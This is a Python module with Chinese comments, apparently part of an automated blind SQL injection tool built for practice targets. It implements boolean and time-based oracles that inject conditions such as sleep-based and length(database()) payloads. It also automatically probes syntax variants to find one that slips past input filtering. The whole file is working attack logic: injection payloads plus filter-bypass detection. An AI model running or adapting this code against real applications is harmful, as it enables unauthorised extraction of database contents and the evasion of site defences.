"""盲注的「提问器」：给它一个条件，它回答真 / 假。

两种实现，对应两种盲注：

    BooleanOracle   看页面差异      页面因条件真假而明显不同时可用（快，约 8 次/字符）
    TimeOracle      看响应耗时      页面完全一样时，靠 sleep() 制造的延迟判断（慢，但万能）

还有一个更重要的工作——语法探测。盲注天然带着一个「能自动判对错」的仪器：
    length(database())>0     一定为真
    length(database())>9999  一定为假
拿这两个已知答案去试每一种写法，两个都答对就说明这种写法没被过滤。
这就是「多种绕过」自动生效的地方，不需要人工猜这一关过滤了什么。
"""
from bypass.syntax import Dialect, candidates
from response import analyzer


class BooleanOracle:
    """布尔盲注：先采真假两个基准页，再按相似度归类。"""

    name = "bool"

    def __init__(self, injector, dialect: Dialect):
        self.injector = injector
        self.dialect = dialect
        self.page_true = injector.inject(dialect.and_cond("1=1"), stage="bool_true").text
        self.page_false = injector.inject(dialect.and_cond("1=2"), stage="bool_false").text
        self.reliable = not analyzer.pages_same(self.page_true, self.page_false)

    def ask(self, cond: str, stage: str = "blind") -> bool:
        page = self.injector.inject(self.dialect.and_cond(cond), stage=stage).text
        return analyzer.ratio(page, self.page_true) >= analyzer.ratio(page, self.page_false)


class TimeOracle:
    """时间盲注：条件为真时让服务端 sleep，靠耗时判断。"""

    name = "time"

    def __init__(self, injector, dialect: Dialect, delay: float = 2.0):
        self.injector = injector
        self.dialect = dialect
        self.delay = delay
        self.base_ms = 0.0
        self.reliable = False

    def calibrate(self) -> bool:
        """先测一个“不 sleep”的基准耗时，再看 sleep 版本是否真的多等了 delay。

        必须相对基准比较：靶机本身单次请求就要 2 秒，用绝对阈值会把
        “假条件”也判成真。
        """
        base = self.injector.inject(self.dialect.and_cond("1=1"), stage="time_base")
        self.base_ms = base.elapsed_ms
        slow = self.injector.inject(
            self.dialect.and_cond(f"if(1=1,sleep({self.delay}),0)"), stage="time_slow")
        self.reliable = (slow.elapsed_ms - self.base_ms) > self.delay * 1000 * 0.5
        return self.reliable

    def ask(self, cond: str, stage: str = "blind_time") -> bool:
        r = self.injector.inject(
            self.dialect.and_cond(f"if({cond},sleep({self.delay}),0)"), stage=stage)
        return (r.elapsed_ms - self.base_ms) > self.delay * 1000 * 0.5


# 「答案已知」的条件，用来验证整条表达式链能不能正确工作
_KNOWN_TRUE = "length(database())>0"
_KNOWN_FALSE = "length(database())>9999"


def _valid(o) -> bool:
    """四项都对才算通过：长度判断 + substr/ascii 判断，且真假都能分辨。

    只测长度不够——逗号被过滤时 length() 照样能用，但 substr() 会挂，
    所以要额外用 substr((SELECT 0x41),1,1) 验证一下切片写法。
    """
    d = o.dialect
    if not o.ask(_KNOWN_TRUE, stage="dialect_check"):
        return False
    if o.ask(_KNOWN_FALSE, stage="dialect_check"):
        return False
    probe = f"ascii({d.substr('(SELECT 0x41)', 1, 1)})"
    if not o.ask(probe + "=65", stage="dialect_check"):
        return False
    if o.ask(probe + "=66", stage="dialect_check"):
        return False
    return True


def probe_dialect(injector, only: str = "auto"):
    """找出一种没被过滤的布尔写法。

    返回 (dialect, oracle)；全部不可用返回 (None, None)。
    """
    for d in candidates(only):
        oracle = BooleanOracle(injector, d)
        if not oracle.reliable:
            continue
        if _valid(oracle):
            injector.dialect = d          # 后续所有请求都沿用这套写法
            return d, oracle
    return None, None


def probe_time_dialect(injector, only: str = "auto", delay: float = 2.0):
    """找出一种没被过滤的时间盲注写法。

    只试前 4 种候选：时间盲注每次要多等 delay 秒，候选太多会很慢，
    而无过滤的常规关卡第一种就过。
    """
    for d in list(candidates(only))[:4]:
        oracle = TimeOracle(injector, d, delay)
        if not oracle.calibrate():
            continue
        if _valid(oracle):
            injector.dialect = d
            return d, oracle
    return None, None
